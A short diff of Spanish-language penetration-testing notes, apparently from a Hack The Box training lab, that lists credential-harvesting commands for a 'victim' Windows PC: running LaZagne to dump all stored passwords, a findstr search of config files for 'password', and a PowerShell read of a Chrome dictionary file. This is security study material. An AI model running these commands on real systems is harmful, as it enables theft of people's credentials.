@@ -25,8 +25,10 @@ Una vez que lo metimos en la pc victima lo corremos con:
     start lazagne.exe all
 
 también podemos usar el findr por cmd:
+
     findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 
-También traer contraseñas de chrome
+También traer contraseñas de chrome:
+
     gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
 
